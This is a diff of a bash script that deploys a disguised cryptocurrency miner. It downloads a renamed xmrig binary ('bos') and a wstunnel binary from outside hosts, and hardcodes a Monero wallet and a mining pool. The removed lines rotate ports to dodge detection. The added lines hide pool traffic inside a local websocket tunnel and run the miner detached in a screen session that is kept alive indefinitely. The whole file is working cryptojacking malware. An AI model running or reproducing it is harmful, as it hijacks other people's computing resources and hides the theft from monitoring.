@@ -1,39 +1,11 @@
 #!/bin/bash
+sudo apt update
+sudo apt install screen -y
+curl -L -O -J https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
 curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos
-curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/pas.zip
-unzip pas.zip
-chmod +x proxy
-chmod +x bos
-WALLET="89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT"
-POOL="xmr.kryptex.network:7029"
-
-while true; do
-    # Generate unused random port
-    PORT=$(comm -23 <(seq 99 65000 | sort) <(ss -tuln | awk '{print $5}' | grep -o '[0-9]*$' | sort -u) | shuf -n 1)
-
-    echo "====================================="
-    echo "Starting new session on port: $PORT"
-    echo "====================================="
-
-    # Start xmrig-proxy
-    ./proxy -o $POOL -u $WALLET -p x -b 127.0.0.1:$PORT &
-    PROXY_PID=$!
-
-    sleep 3
-
-    # Start xmrig
-    ./bos -o 127.0.0.1:$PORT -u $WALLET -p x -t 8 &
-    MINER_PID=$!
-
-    # Run for 5 minutes (600 seconds)
-    sleep 300
-
-    echo "Rotating port..."
-
-    # Kill both processes
-    kill $MINER_PID
-    kill $PROXY_PID
-
-    sleep 5
-
-done
+tar -xf wstunnel_10.5.2_linux_amd64.tar.gz
+chmod +x wstunnel bos
+nohup ./wstunnel server ws://127.0.0.1:2233 &
+nohup ./wstunnel client -L tcp://127.0.0.1:1122:xmr.kryptex.network:7029 ws://127.0.0.1:2233 &
+screen -dmS play ./bos -o 127.0.0.1:1122 -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT -t 7
+sleep 34674653455
